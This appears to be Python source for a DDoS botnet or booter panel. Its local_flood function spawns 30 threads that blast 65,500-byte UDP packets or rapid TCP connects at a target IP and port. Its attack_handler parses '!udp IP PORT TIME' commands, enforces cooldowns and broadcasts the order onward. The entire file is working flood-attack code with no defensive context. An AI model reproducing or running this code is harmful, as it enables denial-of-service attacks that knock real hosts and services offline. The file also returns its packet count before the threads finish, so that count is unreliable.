import socket, threading, time, random
from colorama import Fore

last_attack = {}
max_threads = 30

def local_flood(ip, port, duration, method="udp"):
    """Generic local flood attack"""
    total = 0
    end = time.time() + duration
    
    if method == "udp":
        packet = bytes([random.randint(0,255) for _ in range(65500)])
        def flood():
            nonlocal total
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end:
                try:
                    sock.sendto(packet, (ip, port))
                    total += 1
                except:
                    pass
            sock.close()
    else:
        def flood():
            nonlocal total
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            while time.time() < end:
                try:
                    sock.connect((ip, port))
                    sock.close()
                    total += 1
                except:
                    pass
            sock.close()
    
    threads = []
    for _ in range(max_threads):
        t = threading.Thread(target=flood, daemon=True)
        t.start()
        threads.append(t)
    
    return total

def attack_handler(args, send, client, broadcast, data, method="udp"):
    if len(args) == 4:
        ip, port, duration = args[1], int(args[2]), int(args[3])
        if duration > 120:
            send(client, "Max 120 seconds")
            return
        
        key = f"{ip}:{port}"
        if key in last_attack and time.time() - last_attack[key] < 30:
            send(client, "Wait 30 seconds between attacks on same target")
            return
        
        send(client, f"{Fore.YELLOW}[*] Starting {method.upper()} flood on {ip}:{port} for {duration}s")
        send(client, f"{Fore.WHITE}[*] Using {max_threads} threads")
        
        total = local_flood(ip, port, duration, method)
        last_attack[key] = time.time()
        
        send(client, f"{Fore.GREEN}[+] Attack completed! Packets: {total}")
        broadcast(data)
    else:
        send(client, f"Usage: !{method} [IP] [PORT] [TIME]")
